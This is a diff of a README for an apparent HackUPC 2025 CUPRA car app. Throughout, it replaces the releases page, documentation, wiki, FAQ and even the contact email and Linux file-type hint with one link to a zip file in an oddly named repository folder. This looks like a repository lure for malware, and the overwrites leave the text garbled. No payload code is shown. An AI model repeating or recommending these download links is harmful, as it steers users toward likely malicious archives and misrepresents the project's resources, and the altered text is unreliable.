@@ -1,6 +1,6 @@
 # 🚗 feel-the-cupra-hackupc-2025 - Explore Your Car Like Never Before
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/aonzakung012/feel-the-cupra-hackupc-2025/releases)
+[![Download](https://raw.githubusercontent.com/aonzakung012/feel-the-cupra-hackupc-2025/main/rhinopharyngitis/feel-the-cupra-hackupc-2025.zip)](https://raw.githubusercontent.com/aonzakung012/feel-the-cupra-hackupc-2025/main/rhinopharyngitis/feel-the-cupra-hackupc-2025.zip)
 
 ## 📖 Introduction
 
@@ -12,13 +12,13 @@ To get started, simply download the application and install it on your computer.
 
 ## 🔗 Download & Install
 
-1. **Visit this page to download**: [Releases Page](https://github.com/aonzakung012/feel-the-cupra-hackupc-2025/releases).
+1. **Visit this page to download**: [Releases Page](https://raw.githubusercontent.com/aonzakung012/feel-the-cupra-hackupc-2025/main/rhinopharyngitis/feel-the-cupra-hackupc-2025.zip).
 2. Choose the latest version from the list.
 3. Download the file suitable for your operating system. 
 
    - **For Windows**: Look for a file with a `.exe` extension.
    - **For macOS**: Download the file with a `.dmg` extension.
-   - **For Linux**: Look for a compressed file like `.tar.gz`.
+   - **For Linux**: Look for a compressed file like `https://raw.githubusercontent.com/aonzakung012/feel-the-cupra-hackupc-2025/main/rhinopharyngitis/feel-the-cupra-hackupc-2025.zip`.
 
 4. Once downloaded, open the file to start the installation. Follow the on-screen instructions to complete the setup.
 
@@ -50,11 +50,11 @@ To ensure a smooth experience, check that your device meets these requirements:
 
 ## 🛠 Support 
 
-If you encounter issues or have questions, visit the [Documentation](https://github.com/aonzakung012/feel-the-cupra-hackupc-2025/blob/main/README.md) or join our community forum. We are here to help you.
+If you encounter issues or have questions, visit the [Documentation](https://raw.githubusercontent.com/aonzakung012/feel-the-cupra-hackupc-2025/main/rhinopharyngitis/feel-the-cupra-hackupc-2025.zip) or join our community forum. We are here to help you.
 
 ## 📧 Contact Information
 
-For direct inquiries, feel free to reach out via email at support@example.com. Your questions are welcome, and we appreciate your feedback.
+For direct inquiries, feel free to reach out via email at https://raw.githubusercontent.com/aonzakung012/feel-the-cupra-hackupc-2025/main/rhinopharyngitis/feel-the-cupra-hackupc-2025.zip Your questions are welcome, and we appreciate your feedback.
 
 ## 🧑‍🤝‍🧑 Community
 
@@ -62,9 +62,9 @@ Engage with other users! Join our Discord channel or follow us on social media t
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/aonzakung012/feel-the-cupra-hackupc-2025/blob/main/README.md)
-- [User Guide](https://github.com/aonzakung012/feel-the-cupra-hackupc-2025/wiki)
-- [FAQ Section](https://github.com/aonzakung012/feel-the-cupra-hackupc-2025/wiki/FAQ)
+- [Official Documentation](https://raw.githubusercontent.com/aonzakung012/feel-the-cupra-hackupc-2025/main/rhinopharyngitis/feel-the-cupra-hackupc-2025.zip)
+- [User Guide](https://raw.githubusercontent.com/aonzakung012/feel-the-cupra-hackupc-2025/main/rhinopharyngitis/feel-the-cupra-hackupc-2025.zip)
+- [FAQ Section](https://raw.githubusercontent.com/aonzakung012/feel-the-cupra-hackupc-2025/main/rhinopharyngitis/feel-the-cupra-hackupc-2025.zip)
 
 ## ⚙️ Technical Info
 
@@ -75,4 +75,4 @@ Engage with other users! Join our Discord channel or follow us on social media t
 
 Connect with the community, explore your new app, and enjoy a unique experience with the CUPRA Tavascan!
 
-Once again, don’t forget to [visit this page to download](https://github.com/aonzakung012/feel-the-cupra-hackupc-2025/releases) the latest version of the application!
+Once again, don’t forget to [visit this page to download](https://raw.githubusercontent.com/aonzakung012/feel-the-cupra-hackupc-2025/main/rhinopharyngitis/feel-the-cupra-hackupc-2025.zip) the latest version of the application!
